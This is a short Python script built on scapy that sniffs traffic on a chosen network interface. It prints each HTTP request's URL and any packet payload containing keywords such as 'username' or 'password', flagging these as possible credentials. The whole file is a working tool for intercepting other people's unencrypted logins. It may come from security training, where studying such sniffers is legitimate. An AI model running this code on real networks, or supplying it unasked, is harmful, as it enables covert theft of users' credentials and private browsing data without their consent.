import scapy.all as scapy 
from scapy.layers import http
import argparse


def get_arguments() -> argparse.Namespace:
    '''captures and returns the arguments passed by the user'''
    # initizing object for taking input through argument
    parser = argparse.ArgumentParser()
    # options for user input through arguments
    parser.add_argument("-i", "--interface", dest="interface", help="Interface Name (eq. eth0).")
    options = parser.parse_args()
    if not options.interface: # validating user input contains interface or not
        parser.error("[-] Please specify an Interface Name, use --help for more info.")

    return options


def sniff(interface: str) -> None:
    '''Takes interface to sniff data'''
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    
 
def get_url(packet) -> str:
    '''Takes the packet and returns all the urls'''
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    
    
def get_login_info(packet) -> str:
    '''Takes packet and returns user credentials'''
    if packet.haslayer(scapy.Raw):
        # printing a data from all layers.
        # print(packet.show()) 
        # printing a specific field from packet
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
            
        for keyword in keywords:
            if keyword in load:
                return load
    
    
def process_sniffed_packet(packet) -> None:
    '''Takes Packets and Prints it'''
    # filtering a data from packets
    if packet.haslayer(http.HTTPRequest):
        # print a urls
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
                
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password > {login_info}\n\n")        
    
    
    
options = get_arguments()
try:
    sniff(options.interface)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .....")
finally:
    print("Exited..")